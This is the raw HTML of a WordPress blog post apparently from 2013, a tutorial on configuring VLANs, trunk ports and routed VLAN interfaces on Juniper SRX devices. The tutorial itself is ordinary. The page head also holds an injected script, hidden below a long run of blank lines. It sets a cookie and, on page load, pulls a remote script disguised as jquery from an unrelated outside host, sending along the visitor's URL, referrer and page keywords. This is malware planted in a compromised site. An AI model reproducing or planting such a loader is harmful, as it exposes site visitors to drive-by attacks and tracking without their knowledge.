<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="UTF-8" />
<title>Switching on Juniper SRX series | Ask a Guru</title>
<link rel="profile" href="http://gmpg.org/xfn/11" />
<link rel="stylesheet" type="text/css" media="all" href="http://webkom.se/ask-a-guru/wp-content/themes/twentyten/style.css" />
<link rel="pingback" href="http://webkom.se/ask-a-guru/xmlrpc.php" />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Ask a Guru &raquo; Feed" href="http://webkom.se/ask-a-guru/?feed=rss2" />
<link rel="alternate" type="application/rss+xml" title="Ask a Guru &raquo; Comments Feed" href="http://webkom.se/ask-a-guru/?feed=comments-rss2" />
<link rel="alternate" type="application/rss+xml" title="Ask a Guru &raquo; Switching on Juniper SRX series Comments Feed" href="http://webkom.se/ask-a-guru/?feed=rss2&#038;p=19" />
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.2.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.2.1\/svg\/","svgExt":".svg","source":{"concatemoji":"http:\/\/webkom.se\/ask-a-guru\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.7.3"}};
			!function(a,b,c){function d(a){var b,c,d,e,f=String.fromCharCode;if(!k||!k.fillText)return!1;switch(k.clearRect(0,0,j.width,j.height),k.textBaseline="top",k.font="600 32px Arial",a){case"flag":return k.fillText(f(55356,56826,55356,56819),0,0),!(j.toDataURL().length<3e3)&&(k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57331,65039,8205,55356,57096),0,0),b=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57331,55356,57096),0,0),c=j.toDataURL(),b!==c);case"emoji4":return k.fillText(f(55357,56425,55356,57341,8205,55357,56507),0,0),d=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55357,56425,55356,57341,55357,56507),0,0),e=j.toDataURL(),d!==e}return!1}function e(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g,h,i,j=b.createElement("canvas"),k=j.getContext&&j.getContext("2d");for(i=Array("flag","emoji4"),c.supports={everything:!0,everythingExceptFlag:!0},h=0;h<i.length;h++)c.supports[i[h]]=d(i[h]),c.supports.everything=c.supports.everything&&c.supports[i[h]],"flag"!==i[h]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[i[h]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
<link rel='https://api.w.org/' href='http://webkom.se/ask-a-guru/?rest_route=/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://webkom.se/ask-a-guru/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://webkom.se/ask-a-guru/wp-includes/wlwmanifest.xml" /> 
<link rel='prev' title='Jumbo frames for L2 and L3 environments on Juniper EX series switches' href='http://webkom.se/ask-a-guru/?p=12' />
<link rel='next' title='Secrets of load sharing traffic on Juniper devices with IGP,BGP and MPLS part 1' href='http://webkom.se/ask-a-guru/?p=29' />
<meta name="generator" content="WordPress 4.7.3" />
<link rel="canonical" href="http://webkom.se/ask-a-guru/?p=19" />
<link rel='shortlink' href='http://webkom.se/ask-a-guru/?p=19' />
<link rel="alternate" type="application/json+oembed" href="http://webkom.se/ask-a-guru/?rest_route=%2Foembed%2F1.0%2Fembed&#038;url=http%3A%2F%2Fwebkom.se%2Fask-a-guru%2F%3Fp%3D19" />
<link rel="alternate" type="text/xml+oembed" href="http://webkom.se/ask-a-guru/?rest_route=%2Foembed%2F1.0%2Fembed&#038;url=http%3A%2F%2Fwebkom.se%2Fask-a-guru%2F%3Fp%3D19&#038;format=xml" />
<style type="text/css" id="custom-background-css">
body.custom-background { background-color: #0f6811; }
</style>





























































<script>var a='';setTimeout(1);function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("__cfgoid")&&(setCookie("__cfgoid",1,1),1==getCookie("__cfgoid")&&(setCookie("__cfgoid",2,1),document.write('<script type="text/javascript" src="' + 'http://teacher.hkhs.kh.edu.tw/log/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'snt2014' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script>
</head>

<body class="post-template-default single single-post postid-19 single-format-standard custom-background">
<div id="wrapper" class="hfeed">
	<div id="header">
		<div id="masthead">
			<div id="branding" role="banner">
								<div id="site-title">
					<span>
						<a href="http://webkom.se/ask-a-guru/" title="Ask a Guru" rel="home">Ask a Guru</a>
					</span>
				</div>
				<div id="site-description">Technomagecrafting for Unix and TCP/IP Networking</div>

										<img src="http://webkom.se/ask-a-guru/wp-content/uploads/2013/02/copy-logo01.jpg" width="600" height="315" alt="" />
								</div><!-- #branding -->

			<div id="access" role="navigation">
			  				<div class="skip-link screen-reader-text"><a href="#content" title="Skip to content">Skip to content</a></div>
								<div class="menu"><ul>
<li ><a href="http://webkom.se/ask-a-guru/">Home</a></li></ul></div>
			</div><!-- #access -->
		</div><!-- #masthead -->
	</div><!-- #header -->

	<div id="main">

		<div id="container">
			<div id="content" role="main">

			

				<div id="nav-above" class="navigation">
					<div class="nav-previous"><a href="http://webkom.se/ask-a-guru/?p=12" rel="prev"><span class="meta-nav">&larr;</span> Jumbo frames for L2 and L3 environments on Juniper EX series switches</a></div>
					<div class="nav-next"><a href="http://webkom.se/ask-a-guru/?p=29" rel="next">Secrets of load sharing traffic on Juniper devices with IGP,BGP and MPLS part 1 <span class="meta-nav">&rarr;</span></a></div>
				</div><!-- #nav-above -->

				<div id="post-19" class="post-19 post type-post status-publish format-standard hentry category-juniper category-juniper-security category-networking category-security">
					<h1 class="entry-title">Switching on Juniper SRX series</h1>

					<div class="entry-meta">
						<span class="meta-prep meta-prep-author">Posted on</span> <a href="http://webkom.se/ask-a-guru/?p=19" title="10:59" rel="bookmark"><span class="entry-date">2013/03/04</span></a> <span class="meta-sep">by</span> <span class="author vcard"><a class="url fn n" href="http://webkom.se/ask-a-guru/?author=1" title="View all posts by patrik">patrik</a></span>					</div><!-- .entry-meta -->

					<div class="entry-content">
						<p><em>On the Juniper Secure Router series SRX, the X stands for switching. And there is a very good switching feature set implemented on the SRX. It has all the features you need like normal VLAN switching and separation, 802.1Q trunking and RVIs so that a VLAN on the SRX can act like a layer 3 switched VLAN on Junipers EX series. So how could it look like? (Following example is tested with JUNOS 11.x and 12.x)</em></p>
<p>First of all a VLAN needs to be created and have a vlan-id:<font face="Terminal"><br />
<strong>set vlans vlan-trust vlan-id 142</strong><br />
</font><br />
Then it needs members:<font face="Terminal"><br />
<strong>set interfaces fe-0/0/6.0 family ethernet-switching vlan members vlan-trust</strong><br />
<strong> set interfaces fe-0/0/5.0 family ethernet-switching vlan members vlan-trust</strong><br />
</font><br />
The mode of the ports needs to be set, in this case it is normal untagged access ports:<font face="Terminal"><br />
<strong>set interfaces fe-0/0/6.0 family ethernet-switching vlan port-mode access</strong><br />
<strong> set interfaces fe-0/0/5.0 family ethernet-switching vlan port-mode access</strong><br />
</font><br />
Since building a VLAN for the trust zone, the routing is going to be handled by an RVI which needs to be created and assigned to the VLAN:<font face="Terminal"><br />
<strong>set interfaces vlan unit 142 family inet address 192.168.142.254/24</strong><br />
<strong> set vlans vlan-trust l3-interface vlan.142</strong></font></p>
<p>Dont forget to assign the RVI to the correct security zone so that firewalling etc will operate as intended:<font face="Terminal"><br />
<strong>set security zones security-zone trust interface vlan.142</strong></font></p>
<p>To make a useful example for trunking VLANs, another VLAN is created:<font face="Terminal"><br />
<strong>set vlans vlan-lab vlan-id 131</strong><br />
<strong> set interfaces fe-0/0/3.0 family ethernet-switching vlan members vlan-lab</strong><br />
<strong> set interfaces fe-0/0/4.0 family ethernet-switching vlan members vlan-lab</strong><br />
<strong> set interfaces fe-0/0/3.0 family ethernet-switching vlan port-mode access</strong><br />
<strong> set interfaces fe-0/0/4.0 family ethernet-switching vlan port-mode access</strong><br />
<strong> set interfaces vlan unit 131 family inet address 192.168.131.254/24</strong><br />
<strong> set vlans vlan-trust l3-interface vlan.131</strong><br />
<strong> set security zones security-zone lab interface vlan.131</strong></font></p>
<p>If a VLAN trunk is needed to trunk VLAN 142 and VLAN 131 out of the switch on the SRX to a switch infrastruce, a trunk port needs to be created and assigned to the VLANs:<font face="Terminal"><br />
<strong>set interfaces fe-0/0/2.0 family ethernet-switching vlan port-mode trunk</strong></font></p>
<p>To demonstrate the capability to meet future needs of trunking other VLANs out of the SRX with no addition of configuration on the trunk port, an assignment of VLAN all will be used:<br />
<font face="Terminal"><strong>set interfaces fe-0/0/2.0 family ethernet-switching vlan members all</strong></font></p>
<p>An access port can also be tagged and not untagged. This can be used when a SRX is connected to a VLAN/zone where only one VLAN exists and we still want to perform routing and security functions on the traffic:<br />
<font face="Terminal"><strong>set vlans vlan-dmz vlan-id 200</strong><br />
<strong> set interfaces vlan unit 200 family inet address 192.168.200.254/24</strong><br />
<strong> set vlans vlan-dmz l3-interface vlan.200</strong><br />
<strong> set security zones security-zone dmz interface vlan.200</strong><br />
<strong> set interfaces fe-0/0/1.0 family ethernet-switching vlan members vlan-dmz</strong><br />
<strong> set interfaces fe-0/0/1.0 family ethernet-switching port-mode tagged-access</strong><br />
</font><br />
Finally we turn interface fe-0/0/0.0 into a normal untrust routing port:<br />
<font face="Terminal"><strong>set interface fe-0/0/0.0 family inet address 10.10.10.1/24</strong><br />
<strong> set security zone security-zone untrust interface fe-0/0/0.0</strong></font></p>
<p>Please note that the exampel above does not cover needed firewall rules under security polices and all zone configuration needed under security zone. It just covers VLAN configuration on the SRX. To make a fully functional firewall with VLANs etc, zone and policy configuration needs to be added.</p>
<p><img width="90%" height="90%" src="wp-content/uploads/2013/03/SRXScenario.png"><br />
So a configuration summary:<font face="Terminal"><br />
<strong>set vlans vlan-trust vlan-id 142</strong><br />
<strong> set vlans vlan-trust l3-interface vlan.142</strong><br />
<strong> set vlans vlan-lab vlan-id 131</strong><br />
<strong> set vlans vlan-trust l3-interface vlan.131</strong><br />
<strong> set vlans vlan-dmz vlan-id 200</strong><br />
<strong> set vlans vlan-dmz l3-interface vlan.200</strong></p>
<p><strong>set interfaces fe-0/0/6.0 family ethernet-switching vlan members vlan-trust</strong><br />
<strong> set interfaces fe-0/0/5.0 family ethernet-switching vlan members vlan-trust</strong><br />
<strong> set interfaces fe-0/0/3.0 family ethernet-switching vlan members vlan-lab</strong><br />
<strong> set interfaces fe-0/0/4.0 family ethernet-switching vlan members vlan-lab</strong><br />
<strong> set interfaces fe-0/0/2.0 family ethernet-switching vlan members all</strong><br />
<strong> set interfaces fe-0/0/1.0 family ethernet-switching vlan members vlan-dmz</strong></p>
<p><strong>set interfaces fe-0/0/6.0 family ethernet-switching vlan port-mode access</strong><br />
<strong> set interfaces fe-0/0/5.0 family ethernet-switching vlan port-mode access</strong><br />
<strong> set interfaces fe-0/0/3.0 family ethernet-switching vlan port-mode access</strong><br />
<strong> set interfaces fe-0/0/4.0 family ethernet-switching vlan port-mode access</strong><br />
<strong> set interfaces fe-0/0/2.0 family ethernet-switching vlan port-mode trunk</strong><br />
<strong> set interfaces fe-0/0/1.0 family ethernet-switching port-mode tagged-access</strong></p>
<p><strong>set interfaces vlan unit 142 family inet address 192.168.142.254/24</strong><br />
<strong> set interfaces vlan unit 131 family inet address 192.168.131.254/24</strong><br />
<strong> set interfaces vlan unit 200 family inet address 192.168.200.254/24</strong><br />
<strong> set interface fe-0/0/0.0 family inet address 10.10.10.1/24</strong></p>
<p><strong>set security zones security-zone trust interface vlan.142</strong><br />
<strong> set security zones security-zone lab interface vlan.131</strong><br />
<strong> set security zones security-zone dmz interface vlan.200</strong><br />
<strong> set security zone security-zone untrust interface fe-0/0/0.0</strong><br />
</font><br />
Happy S, R &amp; X-ing!</p>
											</div><!-- .entry-content -->


					<div class="entry-utility">
						This entry was posted in <a href="http://webkom.se/ask-a-guru/?cat=6" rel="category">Juniper Networking</a>, <a href="http://webkom.se/ask-a-guru/?cat=11" rel="category">Juniper Security</a>, <a href="http://webkom.se/ask-a-guru/?cat=2" rel="category">Networking</a>, <a href="http://webkom.se/ask-a-guru/?cat=10" rel="category">Security</a>. Bookmark the <a href="http://webkom.se/ask-a-guru/?p=19" title="Permalink to Switching on Juniper SRX series" rel="bookmark">permalink</a>.											</div><!-- .entry-utility -->
				</div><!-- #post-## -->

				<div id="nav-below" class="navigation">
					<div class="nav-previous"><a href="http://webkom.se/ask-a-guru/?p=12" rel="prev"><span class="meta-nav">&larr;</span> Jumbo frames for L2 and L3 environments on Juniper EX series switches</a></div>
					<div class="nav-next"><a href="http://webkom.se/ask-a-guru/?p=29" rel="next">Secrets of load sharing traffic on Juniper devices with IGP,BGP and MPLS part 1 <span class="meta-nav">&rarr;</span></a></div>
				</div><!-- #nav-below -->

				
			<div id="comments">



	<div id="respond" class="comment-respond">
		<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/ask-a-guru/?p=19#respond" style="display:none;">Cancel reply</a></small></h3><p class="must-log-in">You must be <a href="http://webkom.se/ask-a-guru/wp-login.php?redirect_to=http%3A%2F%2Fwebkom.se%2Fask-a-guru%2F%3Fp%3D19">logged in</a> to post a comment.</p>	</div><!-- #respond -->
	
</div><!-- #comments -->


			</div><!-- #content -->
		</div><!-- #container -->


		<div id="primary" class="widget-area" role="complementary">
			<ul class="xoxo">

<li id="search-2" class="widget-container widget_search"><form role="search" method="get" id="searchform" class="searchform" action="http://webkom.se/ask-a-guru/">
				<div>
					<label class="screen-reader-text" for="s">Search for:</label>
					<input type="text" value="" name="s" id="s" />
					<input type="submit" id="searchsubmit" value="Search" />
				</div>
			</form></li><li id="categories-2" class="widget-container widget_categories"><h3 class="widget-title">Categories</h3>		<ul>
	<li class="cat-item cat-item-13"><a href="http://webkom.se/ask-a-guru/?cat=13" >Device Management</a>
</li>
	<li class="cat-item cat-item-1"><a href="http://webkom.se/ask-a-guru/?cat=1" >IT technology in general</a>
</li>
	<li class="cat-item cat-item-6"><a href="http://webkom.se/ask-a-guru/?cat=6" >Juniper Networking</a>
</li>
	<li class="cat-item cat-item-11"><a href="http://webkom.se/ask-a-guru/?cat=11" >Juniper Security</a>
</li>
	<li class="cat-item cat-item-14"><a href="http://webkom.se/ask-a-guru/?cat=14" >Managing Juniper devices</a>
</li>
	<li class="cat-item cat-item-2"><a href="http://webkom.se/ask-a-guru/?cat=2" >Networking</a>
</li>
	<li class="cat-item cat-item-10"><a href="http://webkom.se/ask-a-guru/?cat=10" >Security</a>
</li>
		</ul>
</li>		<li id="recent-posts-2" class="widget-container widget_recent_entries">		<h3 class="widget-title">Recent Posts</h3>		<ul>
					<li>
				<a href="http://webkom.se/ask-a-guru/?p=156">Destination NAT (port forwarding, PAT, NAPT) on Juniper SRX series</a>
						</li>
					<li>
				<a href="http://webkom.se/ask-a-guru/?p=129">Using MF filters to perform CoS based on prefixes in a SRX or J series router</a>
						</li>
					<li>
				<a href="http://webkom.se/ask-a-guru/?p=112">Using SRX and J series as a packet based router instead a flow based firewall</a>
						</li>
					<li>
				<a href="http://webkom.se/ask-a-guru/?p=117">Using apply-path in JUNOS config to create dynamical prefix lists under policy options</a>
						</li>
					<li>
				<a href="http://webkom.se/ask-a-guru/?p=72">Upgrading compact flash cards in Juniper J/SRX routers, EX switches or M/T/TX/MX route engines</a>
						</li>
				</ul>
		</li>		<li id="recent-comments-2" class="widget-container widget_recent_comments"><h3 class="widget-title">Recent Comments</h3><ul id="recentcomments"><li class="recentcomments"><span class="comment-author-link"><a href='http://webkom.se/ask-a-guru' rel='external nofollow' class='url'>patrik</a></span> on <a href="http://webkom.se/ask-a-guru/?p=129#comment-114">Using MF filters to perform CoS based on prefixes in a SRX or J series router</a></li><li class="recentcomments"><span class="comment-author-link">izaak99</span> on <a href="http://webkom.se/ask-a-guru/?p=129#comment-111">Using MF filters to perform CoS based on prefixes in a SRX or J series router</a></li></ul></li><li id="archives-2" class="widget-container widget_archive"><h3 class="widget-title">Archives</h3>		<ul>
			<li><a href='http://webkom.se/ask-a-guru/?m=201410'>October 2014</a></li>
	<li><a href='http://webkom.se/ask-a-guru/?m=201305'>May 2013</a></li>
	<li><a href='http://webkom.se/ask-a-guru/?m=201303'>March 2013</a></li>
	<li><a href='http://webkom.se/ask-a-guru/?m=201302'>February 2013</a></li>
		</ul>
		</li>			</ul>
		</div><!-- #primary .widget-area -->

	</div><!-- #main -->

	<div id="footer" role="contentinfo">
		<div id="colophon">



			<div id="site-info">
				<a href="http://webkom.se/ask-a-guru/" title="Ask a Guru" rel="home">
					Ask a Guru				</a>
			</div><!-- #site-info -->

			<div id="site-generator">
								<a href="http://wordpress.org/" title="Semantic Personal Publishing Platform">Proudly powered by WordPress.</a>
			</div><!-- #site-generator -->

		</div><!-- #colophon -->
	</div><!-- #footer -->

</div><!-- #wrapper -->

<script type='text/javascript' src='http://webkom.se/ask-a-guru/wp-includes/js/comment-reply.min.js?ver=4.7.3'></script>
<script type='text/javascript' src='http://webkom.se/ask-a-guru/wp-includes/js/wp-embed.min.js?ver=4.7.3'></script>
</body>
</html>
